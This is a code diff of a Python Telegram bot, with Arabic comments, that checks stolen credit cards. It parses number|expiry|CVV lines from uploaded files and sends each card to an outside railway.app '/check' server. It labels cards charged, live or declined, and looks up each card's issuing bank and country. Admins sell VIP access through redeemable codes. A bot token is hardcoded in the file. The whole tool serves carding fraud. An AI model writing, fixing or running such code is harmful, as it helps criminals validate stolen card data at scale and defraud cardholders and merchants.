@@ -13,10 +13,10 @@ from telegram.ext import (
 TOKEN = '8689698569:AAF6GOOcFdsTnG_UXXHLqWkis0bCsIFsQJQ'
 
 # ------------------- Users -------------------
-ADMINS = [6843321125]  # ضع هنا ID الأدمن
+ADMINS = [6843321125]
 VIP_USERS = {}       # {user_id: expiration_timestamp}
 BANNED_USERS = {}    # {user_id: True}
-ALL_USERS = set()    # كل مستخدم دخل البوت
+ALL_USERS = set()
 stop_users = {}
 last_check_time = {}
 ANTI_SPAM_SECONDS = 7
@@ -30,7 +30,7 @@ gate_index = 0
 api_semaphore = asyncio.Semaphore(6)
 
 # ------------------- Codes -------------------
-CODES = {}  # {"WAFA-XXXX-XXXX-XXXX": {"duration":7, "max_users":5, "used":0, "created":timestamp}}
+CODES = {}
 
 # ------------------- BIN Lookup -------------------
 async def get_bin_info(bin_number):
@@ -76,24 +76,34 @@ async def get_bin_info(bin_number):
 
 # ------------------- Check API -------------------
 async def check_card_api(card_full):
+    """
+    دالة الفحص الحقيقية: تبعت الكارت للسيرفر
+    https://mainpy-production-3201.up.railway.app/check
+    وهترجع كل الردود اللي بيردها السيرفر.
+    """
     global gate_index
-    gate = GATES[gate_index]
     gate_index = (gate_index + 1) % len(GATES)
-    params = {"url": gate, "card": card_full, "amount": 1.00}
     async with api_semaphore:
         try:
             async with httpx.AsyncClient(timeout=20) as client:
-                r = await client.get("https://mainpy-production-3201.up.railway.app/check?data=ANYTHING", params=params)
-            result_raw = r.json().get('result','')
-            result = result_raw.lower()
-            if "charge" in result or "success" in result:
-                return "approved", result_raw
-            elif "insufficient" in result:
-                return "live", result_raw
+                r = await client.get(
+                    "https://mainpy-production-3201.up.railway.app/check",  # رابط السيرفر
+                    params={"card": card_full}
+                )
+            data = r.json()
+            # كل الردود هتظهر في response
+            response = str(data)
+            result = data.get("result","").lower()
+
+            if result == "approved":
+                return "approved", response
+            elif result == "live":
+                return "live", response
             else:
-                return "declined", result_raw
-        except:
-            return "declined", "Error"
+                return "declined", response
+
+        except Exception as e:
+            return "declined", f"Error: {e}"
 
 # ------------------- Format Response -------------------
 async def format_response(card_full, status, response, taken):
@@ -126,7 +136,7 @@ def can_user_check(user_id, mode="file"):
     elif user_id in VIP_USERS and VIP_USERS[user_id] > time.time():
         return True
     else:
-        return mode == "single"  # ✅ العادي يقدر يفحص فردي بس
+        return mode == "single"
 
 # ------------------- /pp -------------------
 async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -137,7 +147,6 @@ async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ VIP only for single check.")
         return
 
-    # Anti-spam فقط للعاديين
     if user_id not in ADMINS and (user_id not in VIP_USERS or VIP_USERS[user_id] < time.time()):
         now = time.time()
         last = last_check_time.get(user_id, 0)
@@ -179,30 +188,30 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     stop_users[user_id] = False
-    os.makedirs("downloads", exist_ok=True)
     file = await update.message.document.get_file()
-    file_path = f"downloads/{file.file_id}.txt"
-    await file.download_to_drive(file_path)
-    results_file_path = f"downloads/results_{file.file_id}.txt"
-    approved=live=declined=0
+    lines = await file.download_as_bytearray()
+    lines = lines.decode().splitlines()
+
+    approved = live = declined = 0
     panel_msg = await update.message.reply_text("Start Checking... 🔍")
-    with open(file_path,'r',encoding='utf-8') as f:
-        lines = f.readlines()
 
     async def process_line(line):
-        nonlocal approved,live,declined
-        match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}',line)
+        nonlocal approved, live, declined
+        match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
         if not match: return None
         card_full = match[0]
-        start_time=time.time()
-        status,response = await check_card_api(card_full)
-        await asyncio.sleep(random.uniform(1,5))
-        taken = round(time.time()-start_time,2)
-        text = await format_response(card_full,status,response,taken)
-        if status=="approved": approved+=1; await update.message.reply_text(text)
-        elif status=="live": live+=1; await update.message.reply_text(text)
-        else: declined+=1
-        last_info,last_bank,last_country = await get_bin_info(card_full.split("|")[0][:6])
+        start_time = time.time()
+        status, response = await check_card_api(card_full)
+        await asyncio.sleep(random.uniform(1, 3))
+        taken = round(time.time() - start_time, 2)
+        text = await format_response(card_full, status, response, taken)
+        if status == "approved":
+            approved += 1; await update.message.reply_text(text)
+        elif status == "live":
+            live += 1; await update.message.reply_text(text)
+        else:
+            declined += 1
+        last_info, last_bank, last_country = await get_bin_info(card_full.split("|")[0][:6])
         panel = f"""📊 Status
 
 ✅ Charge: {approved}
@@ -229,13 +238,9 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if stop_users.get(user_id): await update.message.reply_text("Stopped ⛔"); return
         await process_line(line)
 
-    with open(results_file_path,'w',encoding='utf-8') as result_file:
-        for line in lines:
-            r = await format_response(line.strip(),"N/A","N/A",0)
-            result_file.write(r+"\n\n")
-    await update.message.reply_text(f"Done ✅\nResults saved: {results_file_path}")
+    await update.message.reply_text("Done ✅ All cards processed!")
 
-# ------------------- /code -------------------
+# ------------------- Commands: /code, /wafa, /show_users, /ban/unban -------------------
 async def code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     ALL_USERS.add(user_id)
@@ -250,7 +255,6 @@ async def code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     code_data["used"] += 1
     await update.message.reply_text(f"✅ Code activated!\nYou are now VIP for {code_data['duration']} days.\nUsed {code_data['used']}/{code_data['max_users']}")
 
-# ------------------- /wafa -------------------
 async def wafa_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id not in ADMINS: return await update.message.reply_text("❌ Only admin can create codes")
@@ -264,7 +268,6 @@ async def wafa_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     CODES[code] = {"duration":duration,"max_users":max_users,"used":0,"created":time.time()}
     await update.message.reply_text(f"✅ Created code:\n{code}\nDuration: {duration} days\nMax users: {max_users}")
 
-# ------------------- /show_users -------------------
 async def show_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id not in ADMINS: return await update.message.reply_text("❌ Only admin")
@@ -275,7 +278,6 @@ async def show_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
         msg+=f"{uid} - {status}{expire}\n"
     await update.message.reply_text(msg if msg else "No users yet")
 
-# ------------------- Ban/Unban -------------------
 async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id not in ADMINS: return await update.message.reply_text("❌ Only admin can ban users")
